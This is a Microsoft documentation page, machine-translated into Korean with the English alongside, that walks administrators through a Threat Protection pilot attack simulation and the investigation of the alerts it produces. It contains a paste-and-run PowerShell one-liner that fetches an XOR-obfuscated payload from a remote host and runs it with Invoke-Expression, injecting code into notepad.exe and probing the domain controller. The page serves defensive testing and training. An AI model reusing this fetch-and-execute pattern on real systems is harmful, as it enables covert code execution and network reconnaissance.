---
title: Microsoft Threat Protection 공격 시뮬레이션 실행
description: Microsoft Threat Protection 파일럿 프로젝트에 대해 공격 시뮬레이션을 실행 하 여 unfolds 및 신속 하 게 해결 된 방법을 확인 합니다.
keywords: Microsoft Threat Protection 파일럿 공격 시뮬레이션, Microsoft Threat protection 파일럿 공격 시뮬레이션 실행, microsoft threat protection 파일럿 프로젝트, 사이버 보안, 고급 영구 위협, 엔터프라이즈 보안, 장치, 장치, id, 사용자, 데이터, 응용 프로그램, 사건, 자동화 된 조사 및 개선, 고급 구하기
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection: M365-security-compliance
ms.topic: conceptual
ms.openlocfilehash: f7d00575a0a5757f0662c07e727d7166d571e2ca
ms.sourcegitcommit: c083602dda3cdcb5b58cb8aa070d77019075f765
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 09/22/2020
ms.locfileid: "48201198"
---
# <a name="run-your-microsoft-threat-protection-attack-simulations"></a><span data-ttu-id="20556-104">Microsoft Threat Protection 공격 시뮬레이션 실행</span><span class="sxs-lookup"><span data-stu-id="20556-104">Run your Microsoft Threat Protection attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


<span data-ttu-id="20556-105">**적용 대상:**</span><span class="sxs-lookup"><span data-stu-id="20556-105">**Applies to:**</span></span>
- <span data-ttu-id="20556-106">Microsoft 위협 방지</span><span class="sxs-lookup"><span data-stu-id="20556-106">Microsoft Threat Protection</span></span>

<span data-ttu-id="20556-107">파일럿 환경을 준비한 후에는 Microsoft Threat Protection 인시던트 관리 및 자동화 된 조사 및 업데이트 기능을 테스트 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-107">After preparing your pilot environment, it’s time to test the Microsoft Threat Protection incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="20556-108">Microsoft는 고급 기술을 활용 하 여 검색에서 숨기는 정교한 공격을 시뮬레이트하는 데 도움이 될 것입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-108">We will help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="20556-109">이 공격은 도메인 컨트롤러에서 열린 SMB (서버 메시지 블록) 세션을 열거 하 고 사용자 장치의 최근 IP 주소를 검색 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-109">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="20556-110">일반적으로이 유형의 공격에는 처리 되지 않은 장치에 삭제 된 파일이 포함 되지 않으며 메모리에만 발생 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-110">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="20556-111">기존 시스템 및 관리 도구를 사용 하 여 해당 코드를 시스템 프로세스에 주입 하 여 실행을 숨기고, 피하기 검색을 수행 하 고 장치에서 유지할 수 있도록 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-111">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.</span></span>

<span data-ttu-id="20556-112">이 시뮬레이션에서는 샘플 시나리오가 PowerShell 스크립트로 시작 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-112">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="20556-113">사용자가 스크립트를 실행 하는 tricked 될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-113">A user might be tricked into running a script.</span></span> <span data-ttu-id="20556-114">또는 공격자가 네트워크에서 laterally를 이동 하려고 시도 하는 이전에 감염 된 장치에서 다른 컴퓨터로 원격 연결에서 실행 될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-114">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="20556-115">관리자가 여러 가지 관리 작업을 수행 하기 위해 스크립트를 원격으로 실행 하기도 하기 때문에 이러한 스크립트를 검색 하기가 어려울 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-115">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![프로세스 주입 및 SMB reconnaisance 공격 다이어그램을 사용한 Fileless PowerShell 공격](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="20556-117">시뮬레이션 중에는 공격을 통해 겉보기에 shellcode 코드가 삽입 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-117">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="20556-118">이 시나리오에서는 notepad.exe를 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-118">In this scenario, we’ll use notepad.exe.</span></span> <span data-ttu-id="20556-119">시뮬레이션에이 프로세스를 선택 했지만 공격자가 svchost.exe와 같은 장기 실행 시스템 프로세스를 대상으로 하는 것이 더 쉽습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-119">We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="20556-120">그리고 나 서 계속 하는 방법에 대 한 지침을 받으려면 shellcode는 공격자의 C2 (명령 및 제어) 서버에 연락 하 여 이동 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-120">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="20556-121">또한 스크립트는 DC (도메인 컨트롤러)에 대해 검사 쿼리를 실행 하려고 시도 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-121">In addition, the script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="20556-122">이를 통해 공격자는 최근 사용자 로그인 정보에 대 한 정보를 얻을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-122">This allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="20556-123">공격자가 이러한 정보를가지고 있으면 네트워크에서 laterally를 이동 하 여 특정 중요 한 계정에 액세스할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-123">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="20556-124">최적의 결과를 위해 공격 시뮬레이션 지침을 가능한 한 면밀 하 게 따르세요.</span><span class="sxs-lookup"><span data-stu-id="20556-124">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="20556-125">시뮬레이션 환경 요구 사항</span><span class="sxs-lookup"><span data-stu-id="20556-125">Simulation environment requirements</span></span>

<span data-ttu-id="20556-126">준비 단계가 진행 되는 동안 파일럿 환경을 이미 구성 했기 때문에이 시나리오에는 테스트 장치 및 도메인 컨트롤러의 두 장치가 있는지 확인 해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-126">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="20556-127">테 넌 트가 [보호](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)되는지 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-127">Verify your tenant has [Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼.</span></span>
2.  <span data-ttu-id="20556-128">테스트 도메인 컨트롤러 구성을 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-128">Verify your test domain controller configuration:</span></span>
    - <span data-ttu-id="20556-129">장치는 Windows Server 2008 R2 이상 버전에서 실행 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-129">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="20556-130">[Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) 에 대 한 테스트 도메인 컨트롤러와 [원격 관리](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)를 사용 하도록 설정 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-130">The test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="20556-131">[AZURE ATP 및 Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) 을 사용 하도록 설정 되었는지 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-131">Verify that [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="20556-132">테스트 사용자가 도메인에 작성 됨-관리자 권한이 필요 하지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-132">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="20556-133">테스트 장치 구성 확인:</span><span class="sxs-lookup"><span data-stu-id="20556-133">Verify test device configuration:</span></span>
    <br>
    <span data-ttu-id="20556-134">a.</span><span class="sxs-lookup"><span data-stu-id="20556-134">a.</span></span>  <span data-ttu-id="20556-135">장치는 Windows 10 버전 1903 이상 버전에서 실행 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-135">Device runs with Windows 10 version 1903 or a later version.</span></span>
    <br>
    <span data-ttu-id="20556-136">b.</span><span class="sxs-lookup"><span data-stu-id="20556-136">b.</span></span>  <span data-ttu-id="20556-137">테스트 장치가 테스트 도메인에 가입 되어 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-137">Test device is joined to the test domain.</span></span>
    <br>
    <span data-ttu-id="20556-138">c.</span><span class="sxs-lookup"><span data-stu-id="20556-138">c.</span></span>  <span data-ttu-id="20556-139">[Windows Defender 바이러스 백신을 사용 하도록 설정](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-139">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="20556-140">Windows Defender 바이러스 백신을 사용 하도록 설정 하는 데 문제가 있는 경우이 [문제 해결 항목](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)을 참조 하세요.</span><span class="sxs-lookup"><span data-stu-id="20556-140">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <br>
    <span data-ttu-id="20556-141">d.</span><span class="sxs-lookup"><span data-stu-id="20556-141">d.</span></span>  <span data-ttu-id="20556-142">테스트 장치가 [Microsoft Defender Advanced Threat Protection (MDATP)에 등록](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-142">Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="20556-143">기존 테 넌 트를 사용 하 고 장치 그룹을 구현 하는 경우 테스트 장치에 대 한 전용 장치 그룹을 만들고 구성 UX에서 최상위 수준에 밀어넣습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-143">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="20556-144">시뮬레이션 실행</span><span class="sxs-lookup"><span data-stu-id="20556-144">Run the simulation</span></span>

<span data-ttu-id="20556-145">공격 시나리오 시뮬레이션을 실행 하려면:</span><span class="sxs-lookup"><span data-stu-id="20556-145">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="20556-146">테스트 사용자 계정을 사용 하 여 테스트 장치에 로그인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-146">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="20556-147">테스트 장치에서 Windows PowerShell 창을 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-147">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="20556-148">다음 시뮬레이션 스크립트를 복사 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-148">Copy the following simulation script:</span></span>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
><span data-ttu-id="20556-149">웹 브라우저에서이 문서를 여는 경우 특정 문자를 잃지 않거나 추가 줄 바꿈을 도입 하지 않고 전체 텍스트를 복사 하는 데 문제가 있을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-149">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="20556-150">이 문서를 다운로드 하 여 Adobe Reader에서 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-150">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="20556-151">프롬프트에서 복사한 스크립트를 붙여넣고 실행 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-151">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="20556-152">RDP (원격 데스크톱 프로토콜)를 사용 하 여 PowerShell을 실행 하는 경우에는 **CTRL-V** 핫키 또는 오른쪽 클릭 붙여넣기 방법이 작동 하지 않을 수 있으므로 rdp 클라이언트에서 클립보드 텍스트 입력 명령을 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-152">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="20556-153">최신 버전의 PowerShell 에서도 이러한 메서드를 사용할 수 없는 경우도 있는데, 먼저 메모리에서 메모장에 복사한 다음 가상 컴퓨터에 복사한 다음 PowerShell에 붙여 넣어야 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-153">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="20556-154">몇 초 후에 <i>notepad.exe</i> 가 열립니다.</span><span class="sxs-lookup"><span data-stu-id="20556-154">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="20556-155">시뮬레이션 된 공격 코드가 notepad.exe에 삽입 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-155">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="20556-156">전체 시나리오를 경험 하도록 자동으로 생성 된 메모장 인스턴스를 계속 열어 둡니다.</span><span class="sxs-lookup"><span data-stu-id="20556-156">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="20556-157">시뮬레이트된 공격 코드는 외부 IP 주소 (C2 서버 시뮬레이트)와 통신을 시도 하 고 SMB를 통해 도메인 컨트롤러에 대해 정찰을 시도 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-157">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="20556-158">이 스크립트가 완료 되 면 PowerShell 콘솔에 메시지가 표시 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-158">You will see a message displayed on the PowerShell console when this script completes.</span></span>

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="20556-159">자동 인시던트 및 응답 기능을 작동 하는 것을 확인 하려면 notepad.exe 프로세스를 열어 두십시오.</span><span class="sxs-lookup"><span data-stu-id="20556-159">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="20556-160">자동 인시던트 및 응답이 메모장 프로세스를 중지 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-160">You will see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="20556-161">인시던트 조사</span><span class="sxs-lookup"><span data-stu-id="20556-161">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="20556-162">이 시뮬레이션을 안내 하기 전에 다음 비디오를 시청 하 여 문제 관리에서 관련 알림을 조사 프로세스의 일부로 포함 하 고, 포털에서 찾을 수 있으며, 보안 작업에 도움이 되는 방법을 알아봅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-162">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="20556-163">이제 SOC 분석가 보기로 전환한 후에는 Microsoft 365 보안 센터 포털에서 공격을 조사 하기 시작할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-163">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="20556-164">모든 장치에서 [Microsoft 365 보안 센터 포털](https://security.microsoft.com/incidents) 인시던트 큐를 엽니다.</span><span class="sxs-lookup"><span data-stu-id="20556-164">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="20556-165">메뉴에서 **인시던트** 로 이동 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-165">Navigate to **Incidents** from the menu.</span></span> 

    ![Microsoft 365 보안 센터의 왼쪽 메뉴에 표시 되는 인시던트 스크린샷](../../media/mtp/fig1.png)

3.  <span data-ttu-id="20556-167">시뮬레이트된 공격에 대 한 새로운 인시던트가 인시던트 큐에 표시 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-167">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![인시던트 큐의 스크린샷](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="20556-169">단일 인시던트 인 공격 조사</span><span class="sxs-lookup"><span data-stu-id="20556-169">Investigate the attack as a single incident</span></span>

<span data-ttu-id="20556-170">Microsoft Threat Protection은 분석을 연관 시키고 서로 다른 제품의 모든 관련 알림과 조사를 하나의 인시던트 엔터티로 집계 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-170">Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="20556-171">이렇게 하면 Microsoft Threat Protection이 보다 폭넓은 공격 영역을 표시 하 여 SOC 분석가가 복잡 한 위협에 대해 이해 하 고 대응 하도록 허용 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-171">By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="20556-172">이 시뮬레이션 중에 생성 된 경고는 동일한 위협과 연결 되며, 결과적으로 단일 인시던트로 자동 집계 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-172">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="20556-173">인시던트를 확인 하려면:</span><span class="sxs-lookup"><span data-stu-id="20556-173">To view the incident:</span></span>

1.  <span data-ttu-id="20556-174">**문제** 큐로 이동 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-174">Navigate to the **Incidents** queue.</span></span>
 
    ![탐색 메뉴의 인시던트 스크린샷](../../media/mtp/fig1.png)

2.  <span data-ttu-id="20556-176">인시던트 이름 왼쪽에 있는 원으로 클릭 하 여 최신 항목을 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-176">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="20556-177">측면 패널에는 관련 된 모든 경고를 포함 하 여 인시던트에 대 한 추가 정보가 표시 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-177">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="20556-178">각 인시던트는 포함 된 경고의 특성을 기반으로 하는 고유한 이름을 사용 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-178">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![시뮬레이션 중 생성 된 경고가 집계 되는 문제 페이지 스크린샷](../../media/mtp/fig4.png)

    <span data-ttu-id="20556-180">대시보드에 표시 되는 경고는 서비스 리소스 (Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection 및 Office ATP)를 기반으로 필터링 할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-180">The alerts that shows in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.</span></span>  

3.  <span data-ttu-id="20556-181">문제에 대 한 자세한 정보를 보려면 **문제 발생 페이지 열기** 를 선택 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-181">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="20556-182">**인시던트 페이지에서** 문제와 관련 된 모든 경고 및 정보를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-182">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="20556-183">여기에는 경고에 포함 된 엔터티 및 자산, 경고의 검색 원본 (Azure ATP, EDR), 그리고 서로 연결 된 이유가 포함 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-183">This includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="20556-184">검토 문제 경고 목록에는 공격 진행 상태가 표시 됩니다.</span><span class="sxs-lookup"><span data-stu-id="20556-184">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="20556-185">이 보기에서 개별 알림을 보고 조사할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-185">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="20556-186">오른쪽 메뉴에서 **인시던트 관리** 를 클릭 하 여 인시던트에 태그를 지정 하 고, 자신에 게 할당 하 고, 설명을 추가할 수도 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-186">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![인시던트 관리를 클릭 하는 위치 스크린샷](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="20556-188">인시던트 관리 패널에서 인시던트에 태그를 지정 하 고 자신에 게 할당 하 고 의견을 추가할 수 있는 필드 스크린샷</span><span class="sxs-lookup"><span data-stu-id="20556-188">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="20556-189">생성 된 경고 검토</span><span class="sxs-lookup"><span data-stu-id="20556-189">Review generated alerts</span></span> 

<span data-ttu-id="20556-190">시뮬레이트된 공격 중에 생성 된 일부 알림을 살펴보겠습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-190">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="20556-191">여기서는 시뮬레이트된 공격 중에 생성 되는 몇 가지 경고만 안내 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-191">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="20556-192">테스트 장치에서 실행 중인 Windows 버전 및 Microsoft Threat Protection 제품에 따라 약간 다른 경고가 표시 될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-192">Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![생성 된 경고 스크린샷](../../media/mtp/fig6.png) 


<span data-ttu-id="20556-194">**경고: 의심 스러운 프로세스 주입이 관찰 되었습니다 (원본: Microsoft Defender ATP EDR).**</span><span class="sxs-lookup"><span data-stu-id="20556-194">**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="20556-195">고급 공격자는 정교한 및 stealthy 메서드를 사용 하 여 메모리에 유지 하 고 검색 도구에서 숨깁니다.</span><span class="sxs-lookup"><span data-stu-id="20556-195">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="20556-196">일반적인 방법은 악의적인 실행 파일이 아닌 신뢰할 수 있는 시스템 프로세스에서 작동 하 여 악성 코드를 검색 하기 위한 도구 및 보안 작업을 어렵게 만드는 것입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-196">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="20556-197">SOC 분석가가 이러한 advanced 공격을 찾아낼 수 있도록 하기 위해 Microsoft Defender ATP의 딥 메모리 센서가 클라우드 서비스에 다양 한 프로세스 간 코드 주입 기술에 대 한 전례 없는 가시성을 제공 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-197">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="20556-198">다음 그림에서는 Microsoft Defender ATP가 <i>notepad.exe</i>코드 삽입 시도에 대해 어떻게 감지 하 고 알림을 받는 방법을 보여 줍니다.</span><span class="sxs-lookup"><span data-stu-id="20556-198">The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![잠재적 악성 코드 주입에 대 한 경고 스크린샷](../../media/mtp/fig7.png) 


<span data-ttu-id="20556-200">**경고: 프로세스에서 명령줄 인수 없이 실행 된 예기치 않은 동작 (원본: Microsoft Defender ATP EDR)**</span><span class="sxs-lookup"><span data-stu-id="20556-200">**Alert: Unexpected behavior observed by a process run with no command line arguments (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="20556-201">Microsoft Defender ATP 검색은 공격 기술에 대 한 가장 일반적인 특성을 대상으로 하는 경우가 많습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-201">Microsoft Defender ATP detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="20556-202">이렇게 하면 내구성을 보장 하 고 공격자가 최신 기법을 전환할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-202">This ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="20556-203">대규모 학습 알고리즘을 사용 하 여 전 세계의 일반 프로세스에 대 한 일반적인 동작을 설정 하 고 이러한 프로세스에 비정상적인 동작이 발생 하는 경우를 조사 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-203">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes exhibit anomalous behaviors.</span></span> <span data-ttu-id="20556-204">이러한 비정상 동작은 대개 불필요 한 코드가 도입 되어 다른 신뢰할 수 없는 프로세스에서 실행 되 고 있음을 나타냅니다.</span><span class="sxs-lookup"><span data-stu-id="20556-204">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="20556-205">이 시나리오에서 <i>notepad.exe</i> 프로세스에는 외부 위치와의 통신을 포함 하 여 비정상적인 동작이 발생 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-205">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="20556-206">이 결과는 악성 코드를 도입 및 실행 하는 데 사용 되는 구체적인 방법과는 별개입니다.</span><span class="sxs-lookup"><span data-stu-id="20556-206">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
><span data-ttu-id="20556-207">이 경고는 추가 백 엔드 처리가 필요한 기계 학습 모델을 기반으로 하기 때문에 포털에이 경고가 표시 될 때까지 다소 시간이 걸릴 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-207">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="20556-208">경고 세부 정보에는 외부 IP 주소, 즉 확장 조사를 위해 피벗으로 사용할 수 있는 표시기가 포함 되어 있습니다.</span><span class="sxs-lookup"><span data-stu-id="20556-208">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="20556-209">경고 프로세스 트리의 IP 주소를 클릭 하 여 IP 주소 세부 정보 페이지를 확인 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-209">Click the IP address in the alert process tree to view the IP address details page.</span></span>

![명령줄 인수 없이 프로세스에서 예기치 않은 동작이 발생 하는 경우의 경고 스크린샷](../../media/mtp/fig8.png) 

<span data-ttu-id="20556-211">다음 그림에서는 선택한 IP 주소 정보 페이지 (경고 프로세스 트리에서 IP 주소 클릭)를 표시 합니다.</span><span class="sxs-lookup"><span data-stu-id="20556-211">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
